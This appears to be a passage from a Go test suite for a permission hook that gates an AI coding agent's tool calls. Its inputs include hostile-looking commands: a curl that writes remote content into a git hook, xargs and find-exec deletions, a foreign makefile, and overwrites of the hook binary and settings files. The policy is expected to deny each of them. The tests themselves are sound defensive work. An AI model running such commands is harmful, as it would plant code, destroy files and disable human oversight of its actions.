		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("acceptEdits", "Bash", ToolInput{Command: "cp build/out.txt .claude/settings.local.json | cat"}),
	})

	// pipe-readonly-settings-read-allow
	tests = append(tests, &testCase{
		_id:               "pipe-readonly-settings-read-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: "cat .claude/settings.json | head"}),
	})

	// rules-walk-protected-map-allow
	tests = append(tests, &testCase{
		_id:               "rules-walk-protected-map-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: "smine-rules walk --deployed context --direction code-style --map " + filepath.Join(home, ".claude", "skills", "railroad-review", "context-map.json")}),
	})

	// pipe-two-pipes-deny
	tests = append(tests, &testCase{
		_id:               "pipe-two-pipes-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeCompound,

		input: session("default", "Bash", ToolInput{Command: "go test ./... | tail | wc -l"}),
	})

	// pipe-xargs-rm-deny
	tests = append(tests, &testCase{
		_id:                "pipe-xargs-rm-deny",
		_expectedCandidate: "Bash(cat *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeXargsWrite,

		input: session("default", "Bash", ToolInput{Command: "cat list.txt | xargs rm"}),
	})

	// pipe-accept-edits-rm-deny
	tests = append(tests, &testCase{
		_id:               "pipe-accept-edits-rm-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeCompound,

		input: session("acceptEdits", "Bash", ToolInput{Command: "rm -f build/out.txt | cat"}),
	})

	// make-flag-deny
	tests = append(tests, &testCase{
		_id:                "make-flag-deny",
		_expectedCandidate: "Bash(make test *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    approvableCause(unlockMakefile),

		input: session("default", "Bash", ToolInput{Command: "make test -f evil.mk"}),
	})

	// make-undeclared-var-deny
	tests = append(tests, &testCase{
		_id:                "make-undeclared-var-deny",
		_expectedCandidate: "Bash(make test *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeMakeArgs,

		input: session("default", "Bash", ToolInput{Command: "make test GO=evil"}),
	})

	// make-declared-var-allow
	tests = append(tests, &testCase{
		_id:               "make-declared-var-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(make *)",

		input: session("default", "Bash", ToolInput{Command: "make test-shell T=sync_skills_variant"}),
	})

	// make-directory-allow
	tests = append(tests, &testCase{
		_id:               "make-directory-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(make *)",

		input: session("default", "Bash", ToolInput{Command: "make -C ../extra test"}),
	})

	// make-directory-foreign-deny
	tests = append(tests, &testCase{
		_id:                "make-directory-foreign-deny",
		_expectedCandidate: "Bash(make *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeWriteOutside,

		input: session("default", "Bash", ToolInput{Command: "make -C " + filepath.Join(base, "foreign") + " test"}),
	})

	// make-dry-run-allow
	tests = append(tests, &testCase{
		_id:               "make-dry-run-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(make *)",

		input: session("default", "Bash", ToolInput{Command: "make -n test"}),
	})

	// make-pipe-tail-allow
	tests = append(tests, &testCase{
		_id:               "make-pipe-tail-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pipelineAllowReason,

		input: session("default", "Bash", ToolInput{Command: "make test-shell T=x 2>&1 | tail -3"}),
	})

	// make-pipe-flag-deny
	tests = append(tests, &testCase{
		_id:               "make-pipe-flag-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeCompound,

		input: session("default", "Bash", ToolInput{Command: "make test -f x | tail"}),
	})

	// write-makefile-deny
	tests = append(tests, &testCase{
		_id:                "write-makefile-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    makefileCause,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(cwd, "Makefile")}),
	})

	// edit-makefile-approved-allow
	tests = append(tests, &testCase{
		_id:               "edit-makefile-approved-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: approvedGrants,
		input:  session("acceptEdits", "Edit", ToolInput{FilePath: "Makefile"}),
	})

	// write-nested-mk-deny
	tests = append(tests, &testCase{
		_id:                "write-nested-mk-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    makefileCause,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(cwd, "build", "rules.mk")}),
	})

	// write-extra-root-makefile-deny
	tests = append(tests, &testCase{
		_id:                "write-extra-root-makefile-deny",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    makefileCause,

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(extra, "Makefile")}),
	})

	// edit-nested-makefile-approved-allow
	tests = append(tests, &testCase{
		_id:               "edit-nested-makefile-approved-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: approvedGrants,
		input:  session("acceptEdits", "Edit", ToolInput{FilePath: filepath.Join(cwd, "build", "Makefile")}),
	})

	// accept-edits-sed-makefile-deny
	tests = append(tests, &testCase{
		_id:                "accept-edits-sed-makefile-deny",
		_expectedCandidate: "Bash(sed *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    makefileCause,

		input: session("acceptEdits", "Bash", ToolInput{Command: "sed -i '' s/a/b/ Makefile"}),
	})

	// cp-onto-makefile-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-makefile-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    makefileCause,

		input: session("default", "Bash", ToolInput{Command: "cp build/x Makefile"}),
	})

	// git-mv-onto-makefile-deny
	tests = append(tests, &testCase{
		_id:                "git-mv-onto-makefile-deny",
		_expectedCandidate: "Bash(git mv *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    makefileCause,

		input: session("default", "Bash", ToolInput{Command: "git mv build/x Makefile"}),
	})

	// cat-makefile-allow
	tests = append(tests, &testCase{
		_id:               "cat-makefile-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: "cat Makefile"}),
	})

	// cp-onto-hooks-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-hooks-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "cp build/x ~/.claude/hooks/bin/toolpolicy"}),
	})

	// go-build-o-hooks-deny
	tests = append(tests, &testCase{
		_id:                "go-build-o-hooks-deny",
		_expectedCandidate: "Bash(go build *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "go build -o ~/.claude/hooks/bin/toolpolicy ./cmd/x"}),
	})

	// cp-onto-skills-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-skills-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "cp build/x " + filepath.Join(home, ".claude", "skills", "jq", "SKILL.md")}),
	})

	// cp-onto-git-hook-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-git-hook-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeGitDir,

		input: session("default", "Bash", ToolInput{Command: "cp build/x .git/hooks/pre-commit"}),
	})

	// redirect-onto-git-hook-deny
	tests = append(tests, &testCase{
		_id:                "redirect-onto-git-hook-deny",
		_expectedCandidate: "Bash(curl *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeGitDir,

		input: session("default", "Bash", ToolInput{Command: "curl -s https://x.example > .git/hooks/post-commit"}),
	})

	// cp-onto-transcript-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-transcript-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "cp build/x " + transcript}),
	})

	// cp-tilde-settings-deny
	tests = append(tests, &testCase{
		_id:                "cp-tilde-settings-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "cp build/x ~/.claude/settings.json"}),
	})

	// curl-redirect-onto-state-deny
	tests = append(tests, &testCase{
		_id:                "curl-redirect-onto-state-deny",
		_expectedCandidate: "Bash(curl *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "curl -s https://x.example > ~/.claude/tool-policy/state/s.json"}),
	})

	// cat-redirect-onto-cwd-settings-local-deny
	tests = append(tests, &testCase{
		_id:                "cat-redirect-onto-cwd-settings-local-deny",
		_expectedCandidate: "Bash(cat *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("default", "Bash", ToolInput{Command: "cat notes.txt > .claude/settings.local.json"}),
	})

	// curl-redirect-home-var-deny
	tests = append(tests, &testCase{
		_id:                "curl-redirect-home-var-deny",
		_expectedCandidate: "Bash(curl *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeWriteOutside,

		input: session("default", "Bash", ToolInput{Command: `curl -s https://x.example > "$HOME/y"`}),
	})

	// curl-redirect-env-var-deny
	tests = append(tests, &testCase{
		_id:                "curl-redirect-env-var-deny",
		_expectedCandidate: "Bash(curl *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeUnresolvablePath,

		input: session("default", "Bash", ToolInput{Command: `curl -s https://x.example > "$OUT/y"`}),
	})

	// curl-redirect-scratch-allow
	tests = append(tests, &testCase{
		_id:               "curl-redirect-scratch-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(curl *)",

		input: session("default", "Bash", ToolInput{Command: "curl -s https://x.example > " + filepath.Join(scratchpad, "out.txt")}),
	})

	// curl-dup-stderr-allow
	tests = append(tests, &testCase{
		_id:               "curl-dup-stderr-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(curl *)",

		input: session("default", "Bash", ToolInput{Command: "curl -s https://x.example 2>&1"}),
	})

	// cp-onto-main-root-settings-local-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-main-root-settings-local-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeSettingsViaCommand,

		input: session("default", "Bash", ToolInput{Command: "cp build/x " + filepath.Join(mainCheckout, ".claude", "settings.local.json")}),
	})

	// cp-onto-tool-policy-state-deny
	tests = append(tests, &testCase{
		_id:                "cp-onto-tool-policy-state-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "cp build/x ~/.claude/tool-policy/state/s.json"}),
	})

	// cd-into-skills-deny
	tests = append(tests, &testCase{
		_id:                "cd-into-skills-deny",
		_expectedCandidate: "Bash(cd *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeCdProtected,

		input: session("default", "Bash", ToolInput{Command: "cd ~/.claude/skills/railroad-review/workflows"}),
	})

	// cd-compound-into-skills-deny
	tests = append(tests, &testCase{
		_id:                "cd-compound-into-skills-deny",
		_expectedCandidate: "Bash(cd *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeCdProtected,

		input: session("default", "Bash", ToolInput{Command: "cd ~/.claude/skills/railroad-review/workflows && grep -n x lanes.js"}),
	})

	// cd-into-git-dir-deny
	tests = append(tests, &testCase{
		_id:                "cd-into-git-dir-deny",
		_expectedCandidate: "Bash(cd *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeCdProtected,

		input: session("default", "Bash", ToolInput{Command: "cd .git/hooks"}),
	})

	// pushd-into-hooks-deny
	tests = append(tests, &testCase{
		_id:                "pushd-into-hooks-deny",
		_expectedCandidate: "Bash(pushd *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		input: session("default", "Bash", ToolInput{Command: "pushd ~/.claude/hooks"}),
	})

	// cd-into-build-allow
	tests = append(tests, &testCase{
		_id:               "cd-into-build-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   allowReason,

		input: session("default", "Bash", ToolInput{Command: "cd build"}),
	})

	// protected-cwd-deny-names-resolved-path
	tests = append(tests, &testCase{
		_id:                "protected-cwd-deny-names-resolved-path",
		_expectedCandidate: "Bash(smine-rules lanes *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		grants: smineGrants,
		input:  inProtectedCwd,
	})

	// write-skills-names-resolved-path
	tests = append(tests, &testCase{
		_id:                "write-skills-names-resolved-path",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath + ": " + filepath.Join(resolvedHome, ".claude", "skills", "jq", "SKILL.md") + " (cwd " + cwd + ")",

		input: session("acceptEdits", "Write", ToolInput{FilePath: filepath.Join(home, ".claude", "skills", "jq", "SKILL.md")}),
	})

	// cp-recursive-in-roots-rule-allow
	tests = append(tests, &testCase{
		_id:               "cp-recursive-in-roots-rule-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pathFlagAllowReason,

		grants: cpGrants,
		input:  session("default", "Bash", ToolInput{Command: "cp -R build/a " + filepath.Join(extra, "b")}),
	})

	// accept-edits-cp-recursive-allow
	tests = append(tests, &testCase{
		_id:               "accept-edits-cp-recursive-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   pathFlagAllowReason,

		input: session("acceptEdits", "Bash", ToolInput{Command: "cp -Rp build/a build/b"}),
	})

	// cp-recursive-tmp-deny-steer
	tests = append(tests, &testCase{
		_id:                "cp-recursive-tmp-deny-steer",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeTmpWrite,

		grants: cpGrants,
		input:  session("default", "Bash", ToolInput{Command: "cp -R build/a /tmp/b"}),
	})

	// cp-target-directory-allow
	tests = append(tests, &testCase{
		_id:               "cp-target-directory-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(cp *)",

		grants: cpGrants,
		input:  session("default", "Bash", ToolInput{Command: "cp --target-directory=build/b build/a"}),
	})

	// cp-t-flag-allow
	tests = append(tests, &testCase{
		_id:               "cp-t-flag-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(cp *)",

		grants: cpGrants,
		input:  session("default", "Bash", ToolInput{Command: "cp -t build/b build/a"}),
	})

	// cp-recursive-onto-hooks-deny
	tests = append(tests, &testCase{
		_id:                "cp-recursive-onto-hooks-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeProtectedPath,

		grants: cpGrants,
		input:  session("default", "Bash", ToolInput{Command: "cp -R build/x ~/.claude/hooks/y"}),
	})

	// default-mode-cp-recursive-no-rule-deny
	tests = append(tests, &testCase{
		_id:                "default-mode-cp-recursive-no-rule-deny",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "Bash", ToolInput{Command: "cp -R build/a build/b"}),
	})

	// fence-read-inside-denied
	tests = append(tests, &testCase{
		_id:                "fence-read-inside-denied",
		_expectedCandidate: "Read",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("default", "Read", ToolInput{FilePath: filepath.Join(fence, "run.json")}),
		policy: fencedPolicy,
	})

	// fence-grep-path-denied
	tests = append(tests, &testCase{
		_id:                "fence-grep-path-denied",
		_expectedCandidate: "Grep",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("default", "Grep", ToolInput{Path: fence}),
		policy: fencedPolicy,
	})

	// fence-bash-names-root-denied
	tests = append(tests, &testCase{
		_id:                "fence-bash-names-root-denied",
		_expectedCandidate: "Bash(go test *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("default", "Bash", ToolInput{Command: "go test " + fence}),
		policy: fencedPolicy,
	})

	// fence-relative-read-resolved-denied
	tests = append(tests, &testCase{
		_id:                "fence-relative-read-resolved-denied",
		_expectedCandidate: "Read",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("default", "Read", ToolInput{FilePath: "evals/run.json"}),
		policy: fencedPolicy,
	})

	// fence-home-root-edit-denied
	tests = append(tests, &testCase{
		_id:                "fence-home-root-edit-denied",
		_expectedCandidate: "Edit",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("acceptEdits", "Edit", ToolInput{FilePath: filepath.Join(storeArchive, "repo", "proposals", "problems.json")}),
		policy: storeFencedPolicy,
	})

	// fence-bash-tilde-spelling-denied
	tests = append(tests, &testCase{
		_id:                "fence-bash-tilde-spelling-denied",
		_expectedCandidate: "Bash(go test *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("default", "Bash", ToolInput{Command: "go test ~/GolandProjects/agent-plans/repo"}),
		policy: storeFencedPolicy,
	})

	// fence-bash-relative-arg-denied
	tests = append(tests, &testCase{
		_id:                "fence-bash-relative-arg-denied",
		_expectedCandidate: "Bash(cat *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		input:  session("default", "Bash", ToolInput{Command: "cat evals/run.json"}),
		policy: fencedPolicy,
	})

	// fence-bash-copy-into-root-denied
	tests = append(tests, &testCase{
		_id:                "fence-bash-copy-into-root-denied",
		_expectedCandidate: "Bash(cp *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeFenced,

		grants: cpGrants,
		input:  session("acceptEdits", "Bash", ToolInput{Command: "cp build/a ../../home/GolandProjects/agent-plans/repo/proposals/context.json"}),
		policy: storeFencedPolicy,
	})

	// no-fence-read-allowed
	tests = append(tests, &testCase{
		_id:               "no-fence-read-allowed",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		input: session("default", "Read", ToolInput{FilePath: filepath.Join(fence, "run.json")}),
	})

	// fenced-reason-is-generic
	tests = append(tests, &testCase{
		_id:                "fenced-reason-is-generic",
		_expectedCandidate: "Write",
		_expectedDecision:  decisionDeny,
		_expectedReason:    fencedWriteReason,

		input:  session("default", "Write", ToolInput{FilePath: filepath.Join(fence, "golden.json")}),
		policy: fencedPolicy,
	})

	// ungated-todo-allow
	tests = append(tests, &testCase{
		_id:               "ungated-todo-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   ungatedAllowReason,

		input: session("default", "TodoWrite", ToolInput{}),
	})

	// task-stop-denied
	tests = append(tests, &testCase{
		_id:                "task-stop-denied",
		_expectedCandidate: "TaskStop",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeDeniedTool,

		input: session("default", "TaskStop", ToolInput{}),
	})

	// browser-login-loopback-deny
	browserGrants := fixtureGrants(t, cwd)
	browserGrants.Allow = append(browserGrants.Allow, parseRules([]string{"mcp__Claude_Browser"}, "fixture")...)
	tests = append(tests, &testCase{
		_id:                "browser-login-loopback-deny",
		_expectedCandidate: "mcp__Claude_Browser__navigate",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causePaneLogin,

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "http://dev:dev@127.0.0.1:6199/repos"}),
	})

	// browser-login-preview-start-deny
	tests = append(tests, &testCase{
		_id:                "browser-login-preview-start-deny",
		_expectedCandidate: "mcp__Claude_Browser__preview_start",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causePaneLogin,

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__preview_start", ToolInput{Url: "http://dev:dev@LOCALHOST:6199/"}),
	})

	// browser-login-foreign-host-deny
	tests = append(tests, &testCase{
		_id:                "browser-login-foreign-host-deny",
		_expectedCandidate: "mcp__Claude_Browser__navigate",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causePaneLogin,

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "https://user:secret@example.com/login"}),
	})

	// browser-login-user-only-foreign-deny
	tests = append(tests, &testCase{
		_id:                "browser-login-user-only-foreign-deny",
		_expectedCandidate: "mcp__Claude_Browser__navigate",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causePaneLogin,

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "https://user@example.com/"}),
	})

	// browser-batch-foreign-login-deny
	batchActions := BatchActions{
		{Input: BatchActionInput{Url: "http://dev:dev@127.0.0.1:6199/"}},
		{Input: BatchActionInput{}},
		{Input: BatchActionInput{Url: "https://user:secret@example.com/"}},
	}
	tests = append(tests, &testCase{
		_id:                "browser-batch-foreign-login-deny",
		_expectedCandidate: "mcp__Claude_Browser__browser_batch",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causePaneLogin,

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__browser_batch", ToolInput{Actions: batchActions[1:]}),
	})

	// browser-batch-loopback-login-deny
	tests = append(tests, &testCase{
		_id:                "browser-batch-loopback-login-deny",
		_expectedCandidate: "mcp__Claude_Browser__browser_batch",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causePaneLogin,

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__browser_batch", ToolInput{Actions: batchActions[:2]}),
	})

	// browser-plain-loopback-allow
	tests = append(tests, &testCase{
		_id:               "browser-plain-loopback-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "mcp__Claude_Browser",

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "http://127.0.0.1:6199/repos"}),
	})

	// browser-plain-url-allow
	tests = append(tests, &testCase{
		_id:               "browser-plain-url-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "mcp__Claude_Browser",

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "https://example.com/docs"}),
	})

	// browser-unparseable-url-allow
	tests = append(tests, &testCase{
		_id:               "browser-unparseable-url-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "mcp__Claude_Browser",

		grants: browserGrants,
		input:  session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "http://[::1"}),
	})

	// login-check-leaves-other-tools
	tests = append(tests, &testCase{
		_id:               "login-check-leaves-other-tools",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "WebFetch(domain:code.claude.com)",

		input: session("default", "WebFetch", ToolInput{Url: "https://user:secret@code.claude.com/docs"}),
	})

	// browser-without-rule-still-denied
	tests = append(tests, &testCase{
		_id:                "browser-without-rule-still-denied",
		_expectedCandidate: "mcp__Claude_Browser__navigate",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeNoAllowRule,

		input: session("default", "mcp__Claude_Browser__navigate", ToolInput{Url: "http://127.0.0.1:6199/"}),
	})

	// deny-rule-on-ungated-binds
	tests = append(tests, &testCase{
		_id:                "deny-rule-on-ungated-binds",
		_expectedCandidate: "TodoWrite",
		_expectedDecision:  decisionDeny,
		_expectedReason:    "matches deny rule TodoWrite",

		grants: todoDenyGrants,
		input:  session("default", "TodoWrite", ToolInput{}),
	})

	// agent-no-model-deny
	tests = append(tests, &testCase{
		_id:                "agent-no-model-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{SubagentType: "Explore"}),
	})

	// agent-inherit-deny
	tests = append(tests, &testCase{
		_id:                "agent-inherit-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{Model: "inherit", SubagentType: "Explore"}),
	})

	// agent-fable-deny
	tests = append(tests, &testCase{
		_id:                "agent-fable-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{Model: "fable", SubagentType: "Explore"}),
	})

	// agent-fable-id-deny
	tests = append(tests, &testCase{
		_id:                "agent-fable-id-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{Model: "claude-Fable-5-1", SubagentType: "Explore"}),
	})

	// agent-haiku-deny
	tests = append(tests, &testCase{
		_id:                "agent-haiku-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{Model: "haiku", SubagentType: "Explore"}),
	})

	// agent-sonnet5-deny
	tests = append(tests, &testCase{
		_id:                "agent-sonnet5-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{Model: "sonnet5", SubagentType: "Explore"}),
	})

	// agent-opus-4-8-deny
	tests = append(tests, &testCase{
		_id:                "agent-opus-4-8-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    agentModelReason,

		input: session("default", "Agent", ToolInput{Model: "claude-opus-4-8", SubagentType: "Explore"}),
	})

	// agent-vocabulary-unreadable-deny
	tests = append(tests, &testCase{
		_id:                "agent-vocabulary-unreadable-deny",
		_expectedCandidate: "Agent(Explore)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeAgentModels,

		grants: unreadableModelsGrants,
		input:  session("default", "Agent", ToolInput{Model: "opus", SubagentType: "Explore"}),
	})

	// agent-sonnet-5-5-allow
	tests = append(tests, &testCase{
		_id:               "agent-sonnet-5-5-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   ungatedAllowReason,

		input: session("default", "Agent", ToolInput{Model: "claude-sonnet-5-5", SubagentType: "Explore"}),
	})

	// agent-opus-allow
	tests = append(tests, &testCase{
		_id:               "agent-opus-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   ungatedAllowReason,

		input: session("default", "Agent", ToolInput{Model: "opus", SubagentType: "Explore"}),
	})

	// agent-sonnet-allow
	tests = append(tests, &testCase{
		_id:               "agent-sonnet-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   ungatedAllowReason,

		input: session("default", "Agent", ToolInput{Model: "sonnet", SubagentType: "Explore"}),
	})

	// sed-i-inside-allow
	tests = append(tests, &testCase{
		_id:               "sed-i-inside-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   sedWriteAllowReason,

		input: session("default", "Bash", ToolInput{Command: `sed -i '' -e 's/stmtLevel/stmtDepth/g' internal/skillmodel/smt.go`}),
	})

	// sed-i-foreign-deny
	tests = append(tests, &testCase{
		_id:                "sed-i-foreign-deny",
		_expectedCandidate: "Bash(sed *)",
		_expectedDecision:  decisionDeny,
		_expectedReason:    causeWriteOutside,

		input: session("default", "Bash", ToolInput{Command: "sed -i '' s/a/b/ " + filepath.Join(base, "elsewhere", "x.go")}),
	})

	// find-exec-deny-cause-text
	tests = append(tests, &testCase{
		_id:               "find-exec-deny-cause-text",
		_expectedDecision: decisionDeny,
		_expectedReason:   "runs or deletes past every check",

		input: session("default", "Bash", ToolInput{Command: "find build -name x -execdir rm {} +"}),
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			testGrants := grants
			if test.grants != nil {
				testGrants = test.grants
			}
			testPolicy := policy
			if test.policy != nil {
				testPolicy = test.policy
			}
			verdict := Decide(test.input, testPolicy, testGrants, home, test.statePath)
			assert.Equal(t, test._expectedDecision, verdict.Decision)
			assert.Equal(t, test._expectedCandidate, verdict.CandidateRule)
			assert.Contains(t, verdict.Reason, test._expectedReason)
		})
	}
}

func TestDecide_SkillEnforceSwitch(t *testing.T) {
	type testCase struct {
		_id               string
		_expectedCause    string
		_expectedDecision string
		_isLogged         bool

		grants    *Grants
		input     *HookInput
		statePath string
	}

	policy := defaultToolpolicy(t)

	base := fixtureBase(t)
	home := filepath.Join(base, "home")
	cwd := filepath.Join(base, "repo", "work")
	stateDir := filepath.Join(base, "state")
	handSpawn := &HookInput{Cwd: cwd, ToolInput: ToolInput{Model: "sonnet", SubagentType: "heartbeat-demo-worker"}, ToolName: toolNameAgent}
	handSpawnCause := "enforce(heartbeat-demo): heartbeat-demo-worker agents are spawned only by the skill's Workflow"
	enforceGrants := fixtureGrants(t, cwd)
	enforceGrants.Enforce = []*GateRules{demoGate()}
	unreadableModelsGrants := fixtureGrants(t, cwd)
	unreadableModelsGrants.Enforce = []*GateRules{demoGate()}
	unreadableModelsGrants.Models = nil
	enforceOff := &sessionstate.SessionState{Switches: sessionstate.Switches{Off: []sessionstate.Feature{sessionstate.SkillEnforce}}}

	tests := make([]*testCase, 0)

	// enforce-on-denies
	tests = append(tests, &testCase{
		_id:               "enforce-on-denies",
		_expectedCause:    handSpawnCause,
		_expectedDecision: decisionDeny,
		_isLogged:         false,

		grants:    enforceGrants,
		input:     handSpawn,
		statePath: filepath.Join(stateDir, "enforce-on-denies.json"),
	})

	// enforce-off-allows
	offPath := filepath.Join(stateDir, "enforce-off-allows.json")
	require.NoError(t, sessionstate.Save(offPath, enforceOff))
	tests = append(tests, &testCase{
		_id:               "enforce-off-allows",
		_expectedCause:    "",
		_expectedDecision: decisionAllow,
		_isLogged:         false,

		grants:    enforceGrants,
		input:     handSpawn,
		statePath: offPath,
	})

